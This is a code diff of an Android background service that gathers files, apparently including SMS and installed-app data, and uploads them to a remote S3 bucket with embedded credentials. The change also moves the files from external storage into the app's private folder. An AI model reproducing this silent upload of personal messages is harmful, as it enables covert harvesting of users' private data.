@@ -3,6 +3,7 @@ package info.kalagato.com.extractor;
 import android.app.Notification;
 import android.app.PendingIntent;
 import android.app.Service;
+import android.content.Context;
 import android.content.Intent;
 import android.os.Environment;
 import android.os.Handler;
@@ -60,9 +61,11 @@ public class SyncService extends Service {
             String formattedDate = df.format(c);
 
             String path = Environment.getExternalStorageDirectory().toString()+"/Folder";
+                File mydir = getApplicationContext().getDir("mydir", Context.MODE_PRIVATE);
 
-            File directory = new File(path);
+            File directory = new File(mydir.getPath());
             File[] files = directory.listFiles();
+
 
 
             for (int i = 0; i < files.length; i++)
@@ -70,7 +73,8 @@ public class SyncService extends Service {
                 if(files[i].getName().contains(Constant.SMS) ||
                         files[i].getName().contains(Constant.INSTALLED_APP) ||
                         !files[i].getName().contains(formattedDate)){
-                    uploadWithTransferUtility(files[i].getName());
+                       // files[i].delete();
+                        uploadWithTransferUtility(files[i]);
                 }
             }
             }catch (Exception ex){
@@ -80,7 +84,7 @@ public class SyncService extends Service {
 
         }
 
-        public void uploadWithTransferUtility(String filename) {
+        public void uploadWithTransferUtility(File file) {
 
             BasicAWSCredentials credentials = new BasicAWSCredentials(KEY, SECRET);
             AmazonS3Client s3Client = new AmazonS3Client(credentials);
@@ -94,11 +98,11 @@ public class SyncService extends Service {
 
 
 
-            final File file = new File(Environment.getExternalStorageDirectory(),
-                    "/Folder/" + filename);
+           /* final File file = new File(getApplicationContext().getDir("mydir", Context.MODE_PRIVATE),
+                    "/Folder/" + filename);*/
             String YOUR_BUCKET_NAME = "app-data-extracted";
             TransferObserver uploadObserver = transferUtility.upload(YOUR_BUCKET_NAME,
-                            "" + getPackageName() + "/"+filename,file);
+                            "" + getPackageName() + "/"+file.getName(),file);
 
             // Attach a listener to the observer to get state update and progress notifications
             uploadObserver.setTransferListener(new TransferListener() {
